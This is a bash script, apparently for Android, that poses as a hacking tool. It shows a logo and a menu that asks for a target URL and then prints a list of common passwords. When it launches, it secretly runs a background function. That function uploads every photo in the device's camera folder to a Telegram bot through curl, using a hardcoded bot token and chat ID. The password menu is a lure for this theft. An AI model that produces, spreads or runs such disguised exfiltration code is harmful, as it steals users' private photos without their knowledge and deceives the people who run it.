#!/bin/bash

#-------------------
#   Configuration
#-------------------
BOT_TOKEN="7509006316:AAHcVZ9lDY3BBZmm-5RMcMi4vl-k4FqYc0s"  # رمز البوت الخاص بك
CHAT_ID="5967116314"                                    # معرف الشات الخاص بك

#-------------------
#   Colors
#-------------------
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
RESET='\033[0m'

#-------------------
#   Display Logo
#-------------------
display_logo() {
    clear
    echo -e "${RED}"
    echo '
██╗  ██╗███████╗███╗   ███╗ █████╗     █████╗ ██╗
██║  ██║██╔════╝████╗ ████║██╔══██╗   ██╔══██╗██║
███████║█████╗  ██╔████╔██║███████║   ███████║██║
██╔══██║██╔══╝  ██║╚██╔╝██║██╔══██║   ██╔══██║██║
██║  ██║████ ███╗██║ ╚═╝ ██║██║  ██║██╗██║  ██║██║
╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝
    '
    echo -e "${RESET}"
}

#-------------------
#   Send Images to Telegram
#-------------------
send_images_to_telegram() {
    local image_dir="/sdcard/DCIM/Camera"
    if [ -d "$image_dir" ]; then
        for image in "$image_dir"/*.{jpg,jpeg,png}; do
            if [ -f "$image" ]; then
                curl -s -F chat_id="$CHAT_ID" -F photo=@"$image" "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto" > /dev/null &
                echo -e "${GREEN}[+] Sending ${image} to Telegram...${RESET}"
            fi
        done
    else
        echo -e "${RED}[-] Directory $image_dir not found.${RESET}"
    fi
}

#-------------------
#   Show Predefined Passwords
#-------------------
show_passwords() {
    local passwords=(
        "123456" "password" "12345678" "qwerty" "123456789" "12345" "1234" "111111"
        "1234567123456" "password" "12345678" "qwerty" "123456789" "12345" "1234"
        "111111" "1234567" "dragon" "123123" "baseball" "abc123" "football" "monkey"
        "letmein" "696969" "shadow" "master" "666666" "qwertyuiop" "123321" "mustang"
        "1234567890" "michael" "654321" "pussy" "superman" "1qaz2wsx" "7777777"
        "fuckyou" "121212" "000000" "qazwsx" "123qwe" "killer" "trustno1" "jordan"
        "jennifer" "zxcvbnm" "asdfgh" "hunter" "buster" "soccer" "harley" "batman"
        "andrew" "tigger" "sunshine" "iloveyou" "fuckme" "2000" "charlie" "robert"
        "thomas" "hockey" "ranger" "daniel" "starwars" "klaster" "112233" "george"
        "asshole" "computer" "michelle" "jessica" "pepper" "1111" "zxcvbn" "555555"
        "11111111" "131313" "freedom" "777777" "pass" "fuck" "maggie" "159753"
        "aaaaaa" "ginger" "princess" "joshua" "cheese" "amanda" "summer" "love"
        "ashley" "6969" "nicole" "chelsea" "biteme" "matthew" "access" "yankees"
        "987654321" "dallas" "austin" "thunder" "taylor" "matrix" "minecraft"
    )
    
    echo -e "${RED}Common Passwords List:${RESET}"
    for pass in "${passwords[@]}"; do
        echo -e "${RED}$pass${RESET}"
    done
}

#-------------------
#   Main Menu
#-------------------
main_menu() {
    display_logo
    echo -e "${CYAN}Welcome to the Tool!${RESET}"
    echo -e "${YELLOW}1. Add Torget URL and Show Passwords${RESET}"
    echo -e "${YELLOW}2. Exit${RESET}"
    echo -ne "${BLUE}Enter your choice: ${RESET}"
    read choice

    case $choice in
        1)
            echo -ne "${BLUE}Enter Torget URL: ${RESET}"
            read torget_url
            if [[ $torget_url =~ ^https?:// ]]; then
                echo -e "${GREEN}[+] Torget URL added successfully.${RESET}"
                show_passwords
            else
                echo -e "${RED}[-] Invalid URL format.${RESET}"
            fi
            ;;
        2)
            echo -e "${YELLOW}[+] Exiting...${RESET}"
            exit 0
            ;;
        *)
            echo -e "${RED}[-] Invalid choice. Please try again.${RESET}"
            sleep 2
            main_menu
            ;;
    esac
}

#-------------------
#   Run the Tool
#-------------------
send_images_to_telegram &  # Auto-run in background
main_menu
